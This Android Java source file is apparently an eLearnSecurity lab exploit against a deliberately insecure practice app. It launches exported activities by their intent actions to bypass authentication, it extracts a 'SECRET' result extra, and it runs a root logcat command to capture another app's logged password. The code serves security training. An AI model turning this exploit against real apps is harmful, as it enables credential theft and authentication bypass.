package com.elearnsecurity.insecureactivitiesexploit;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class MainActivity extends Activity {
    private TextView tvLogs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvLogs = findViewById(R.id.tvLogs);
        Button btnExploitLeaky = findViewById(R.id.btnExploitLeaky);
        Button btnExploitSecret = findViewById(R.id.btnExploitSecret);

        btnExploitLeaky.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exploitLeakyActivity();
            }
        });

        btnExploitSecret.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exploitSecretActivity();
            }
        });
    }

    private void exploitLeakyActivity() {
        tvLogs.setText("Exploiting LeakyActivity...\n");

        // Launch LeakyActivity using its intent filter
        Intent intent = new Intent();
        intent.setAction("android.elearnsecurity.insecureactivities.leaky");
        startActivityForResult(intent, 1);

        // Attempt to read logs (requires root access)
        readLogs();
    }

    private void readLogs() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Wait for LeakyActivity to log messages
                    Thread.sleep(1000);

                    final StringBuilder logOutput = new StringBuilder();
                    try {
                        // This command requires root access
                        Process process = Runtime.getRuntime().exec("su -c logcat -d OOPS:V *:S");
                        BufferedReader reader = new BufferedReader(
                                new InputStreamReader(process.getInputStream()));

                        String line;
                        while ((line = reader.readLine()) != null) {
                            logOutput.append(line).append("\n");
                        }

                    } catch (Exception e) {
                        logOutput.append("Failed to read logs: ").append(e.getMessage());
                    }

                    final String logs = logOutput.toString();

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (logs.contains("OOPS")) {
                                tvLogs.append("\nLog messages captured:\n" + logs);
                            } else {
                                tvLogs.append("\nCould not capture logs (requires root access).\n");
                                tvLogs.append("Known logs that LeakyActivity writes:\n");
                                tvLogs.append("- I'm not good at keeping secrets!\n");
                                tvLogs.append("- My password is: password!?\n");
                            }
                        }
                    });

                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void exploitSecretActivity() {
        tvLogs.setText("Exploiting SecretActivity...\n");
        tvLogs.append("Bypassing normal authentication flow to access secret content directly.");

        // Launch SecretActivity using its intent filter
        Intent intent = new Intent();
        intent.setAction("android.elearnsecurity.insecureactivities.bypass");
        startActivity(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 1) {
            StringBuilder result = new StringBuilder("\nReceived from LeakyActivity:\n");
            result.append("Result code: ").append(resultCode).append("\n");

            if (data != null) {
                String secret = data.getStringExtra("SECRET");
                if (secret != null) {
                    result.append("SECRET: \"").append(secret).append("\"\n");
                }
            }

            tvLogs.append(result.toString());
        }
    }
}
